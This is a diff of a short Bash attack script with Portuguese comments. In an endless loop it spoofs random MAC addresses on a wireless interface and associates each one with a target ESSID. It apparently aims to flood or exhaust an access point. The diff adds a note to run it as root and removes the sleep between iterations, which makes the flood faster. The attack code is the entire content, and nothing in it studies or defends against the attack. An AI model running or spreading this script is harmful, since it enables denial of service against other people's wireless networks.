@@ -1,4 +1,5 @@
 #!/bin/bash
+# Execute esse script como root
 
 ataque(){
 	while true; do
@@ -8,7 +9,7 @@ ataque(){
 		terceiro=` echo "obase=16;" $(( ( RANDOM % 255 )  + 1 )) | bc`
 		ifconfig $1 hw ether 00:16:3e:$primeiro:$segundo:$terceiro;
 		ifconfig $1 up;
-		sleep 1
+		#sleep 1
 		echo "Ataque operando pelo MAC : " 00:16:3e:$primeiro:$segundo:$terceiro " sendo desenvolvido."
 		iwconfig $1 essid $2 ;
 	done
